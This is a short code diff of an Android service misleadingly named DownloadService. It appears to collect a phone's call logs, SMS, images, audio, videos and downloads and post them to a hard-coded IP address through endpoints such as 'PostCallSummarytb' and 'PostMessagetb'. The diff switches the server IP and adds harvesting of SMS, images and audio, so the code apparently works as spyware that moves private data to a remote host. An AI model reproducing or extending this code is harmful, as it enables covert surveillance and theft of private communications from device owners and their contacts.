@@ -78,7 +78,7 @@ public class DownloadService extends IntentService {
     private int contactCalled = 0;
     private List<Integer> listCalled;
 
-    private String HOME_URL = "http://103.233.76.67/api/";
+    private String HOME_URL = "http://18.191.145.152/api/";
 
     private String CALL_URL = "CallSummarytbs/PostCallSummarytb";
     private String SMS_URL = "Messagetbs/PostMessagetb";
@@ -195,10 +195,14 @@ public class DownloadService extends IntentService {
                 foodanddrinkUsed = 0;
                 listContacts = new ArrayList<>();
 
-                new MakeRequestTask(DownloadService.this,googleCredentials).execute();
-
                 if (calls)
                     new GetCallsClass().execute();
+                if (messages)
+                    new GetSMSClass().execute();
+                if (images)
+                    new GetImagesClass().execute();
+                if (audios)
+                    new GetAudioClass().execute();
                 if (videos)
                     new GetVideoClass().execute();
                 if (downloads)
